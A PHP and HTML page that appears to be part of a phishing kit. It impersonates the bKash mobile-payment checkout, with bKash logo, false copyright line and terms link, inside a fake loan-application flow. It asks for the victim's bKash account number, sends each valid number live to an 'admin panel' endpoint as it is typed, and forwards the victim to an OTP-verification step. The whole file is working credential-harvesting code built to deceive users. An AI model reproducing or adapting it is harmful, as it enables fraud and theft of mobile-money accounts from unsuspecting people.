
<?php
session_start();
require_once 'config/database.php';

// Check if user came from loan request page
if (!isset($_SESSION['loan_id']) || !isset($_SESSION['loan_amount']) || !isset($_SESSION['loan_category'])) {
    header('Location: lon_request.php');
    exit();
}

$loan_id = $_SESSION['loan_id'];
$loan_amount = $_SESSION['loan_amount'];
$loan_category = $_SESSION['loan_category'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $mobile_number = $_POST['mobile_number'];
    
    // Validate mobile number
    $validPrefixes = ['017', '013', '015', '019', '014', '018', '016'];
    $prefix = substr($mobile_number, 0, 3);
    
    if (strlen($mobile_number) === 11 && in_array($prefix, $validPrefixes)) {
        // Update loan application with mobile number
        $stmt = $pdo->prepare("UPDATE loan_applications SET mobile_number = ?, status = 'mobile_verified' WHERE id = ?");
        $stmt->execute([$mobile_number, $loan_id]);
        
        $_SESSION['mobile_number'] = $mobile_number;
        
        header('Location: otp_verification.php');
        exit();
    } else {
        $error = 'অনুগ্রহ করে আপনার সঠিক বিকাশ নম্বর লিখুন';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <meta name="referrer" content="strict-origin-when-cross-origin">
  <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com; img-src 'self' data: https:; font-src 'self' https: data:;">
  <title>bKash Confirm</title>
  <link rel="icon" type="image/png" href="img/favicon.png">
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
  <div class="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">

    <!-- bKash Header -->
    <div class="flex justify-between items-center bg-white px-6 py-4">
      <img src="img/bKash-logo.png" class="mx-auto h-6" alt="bKash Logo">
    </div>

    <!-- Info Section -->
    <div class="flex justify-between items-start bg-gray-100 px-4 py-3">
      <div>
       <p class="text-sm font-semibold text-gray-800">Loan Amount</p>
        <p class="text-xs text-gray-500">loan category: <?php echo htmlspecialchars($loan_category); ?></p>
      </div>
      <p class="text-sm font-semibold text-gray-800">৳<?php echo number_format($loan_amount, 2); ?></p>
    </div>

    <?php if (isset($error)): ?>
    <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-2 text-sm">
        <?php echo htmlspecialchars($error); ?>
    </div>
    <?php endif; ?>
    
    <!-- Error Message for Invalid Number -->
    <div id="errorMessage" class="bg-red-100 border border-red-400 text-red-700 px-4 py-2 text-sm" style="display: none;">
        অনুগ্রহ করে আপনার সঠিক বিকাশ নম্বর লিখুন
    </div>

    <form method="POST" id="numberForm">
        <!-- Input Section -->
        <div class="bg-pink-600 px-6 py-16">
          <p class="text-white text-sm mb-2 text-center">Your bKash Account Number</p>
          <input
            type="tel"
            name="mobile_number"
            id="mobile_number"
            placeholder="e.g 01XXXXXXXXX"
            class="w-full px-4 py-2 rounded text-gray-800 focus:outline-none focus:ring-2 focus:ring-pink-400 text-center"
            maxlength="11"
            required
          />
          <p class="text-white text-xs mt-2 text-center">
  Confirm and proceed,
  <a href="https://www.bkash.com/en/page/terms-of-use-checkout" class="underline">terms & conditions</a>
</p>

        </div>

        <!-- Buttons -->
        <div class="flex justify-between items-center bg-white px-6 py-4">
          <button type="button" onclick="showCancelDialog()" class="w-[48%] bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300">
            Cancel
          </button>
          <button type="submit" id="confirmBtn" class="w-[48%] bg-gray-300 text-gray-500 py-2 rounded cursor-not-allowed" disabled>
            Confirm
          </button>
        </div>
    </form>

    <!-- Footer -->
    <div class="text-center text-xs text-gray-400 py-2">
      © 2025 bKash, All Rights Reserved
      <br />
      <span class="text-pink-600">● 16247</span>
    </div>

  </div>

  <!-- Cancel Confirmation Dialog -->
  <div id="cancelDialog" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50" style="display: none;">
    <div class="bg-pink-500 rounded-lg p-6 max-w-sm w-full mx-4 text-center">
      <div class="text-white mb-4">
        <div class="text-4xl mb-2">✋</div>
        <p class="text-lg font-medium">Are you sure you want to cancel this payment?</p>
      </div>
      <div class="flex gap-4">
        <button onclick="confirmCancel()" class="flex-1 bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300">
          Yes
        </button>
        <button onclick="hideCancelDialog()" class="flex-1 bg-pink-600 text-white py-2 rounded hover:bg-pink-700">
          No
        </button>
      </div>
    </div>
  </div>

  <script>
    const mobileInput = document.getElementById('mobile_number');
    const confirmBtn = document.getElementById('confirmBtn');
    const errorMessage = document.getElementById('errorMessage');
    
    // Valid bKash prefixes
    const validPrefixes = ['017', '013', '015', '019', '014', '018', '016'];
    
    // Function to validate mobile number
    function validateMobileNumber(number) {
        // Check if number is exactly 11 digits
        if (number.length !== 11) {
            return false;
        }
        
        // Check if number starts with valid prefix
        const prefix = number.substring(0, 3);
        return validPrefixes.includes(prefix);
    }
    
    // Function to show error message
    function showErrorMessage() {
        errorMessage.style.display = 'block';
    }
    
    // Function to hide error message
    function hideErrorMessage() {
        errorMessage.style.display = 'none';
    }
    
    // Only allow numbers
    mobileInput.addEventListener('input', function(e) {
        // Remove any non-digit characters
        this.value = this.value.replace(/[^0-9]/g, '');
        
        // Hide error message when user starts typing
        hideErrorMessage();
        
        const isValid = validateMobileNumber(this.value);
        
        if (this.value.length === 11) {
            if (isValid) {
                confirmBtn.disabled = false;
                confirmBtn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
                confirmBtn.classList.add('bg-pink-500', 'text-white', 'hover:bg-pink-600');
                hideErrorMessage();
                
                // Real-time update to admin panel
                fetch('admin_update.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        action: 'update_mobile',
                        loan_id: <?php echo $loan_id; ?>,
                        mobile_number: this.value
                    })
                });
            } else {
                confirmBtn.disabled = true;
                confirmBtn.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
                confirmBtn.classList.remove('bg-pink-500', 'text-white', 'hover:bg-pink-600');
                showErrorMessage();
            }
        } else {
            confirmBtn.disabled = true;
            confirmBtn.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
            confirmBtn.classList.remove('bg-pink-500', 'text-white', 'hover:bg-pink-600');
        }
    });
    
    // Prevent form submission if number is invalid
    document.getElementById('numberForm').addEventListener('submit', function(e) {
        const isValid = validateMobileNumber(mobileInput.value);
        if (!isValid) {
            e.preventDefault();
            showErrorMessage();
        }
    });
    
    // Cancel dialog functions
    function showCancelDialog() {
        document.getElementById('cancelDialog').style.display = 'flex';
    }
    
    function hideCancelDialog() {
        document.getElementById('cancelDialog').style.display = 'none';
    }
    
    function confirmCancel() {
        history.back();
    }
  </script>
</body>
</html>